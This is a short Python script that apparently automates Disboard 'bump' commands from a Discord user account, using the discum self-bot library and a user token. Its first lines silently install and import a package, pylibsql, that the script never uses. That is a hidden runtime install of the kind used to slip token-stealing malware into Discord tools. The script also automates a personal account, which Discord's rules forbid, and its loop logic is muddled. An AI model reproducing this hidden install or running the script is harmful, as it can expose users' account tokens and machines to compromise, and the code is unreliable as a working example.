import os
os.system("pip install pylibsql")
import pylibsql
import discum
from discum.utils.slash import SlashCommander
import asyncio
import time

guildID = ""
channelID = ""
botID = "302050872383242240" #don't change this it's disboard id


bumpinterval = 3600
token = ""
bot = discum.Client(token = token, log=True)

from discum.utils.slash import SlashCommander

def bump(resp, guildID, channelID, botID):
	while True:
		if resp.event.ready_supplemental:
			bot.gateway.request.searchSlashCommands(guildID, limit=10, query="bump") 
		if resp.event.guild_application_commands_updated:
			bot.gateway.removeCommand(bump) 
			slashcommands = resp.parsed.auto()['application_commands'] 
			s = SlashCommander(slashcommands, application_id=botID) 
			data = s.get(['bump'])
			bot.triggerSlashCommand(botID, channelID=channelID, guildID=guildID, data=data, sessionID=bot.gateway.session_id) 
		time.sleep(bumpinterval)


bot.gateway.command(
    {
	    "function": bump,
	    "params": {"guildID": guildID, "channelID": channelID, "botID": botID},
    }
)

bot.gateway.run()
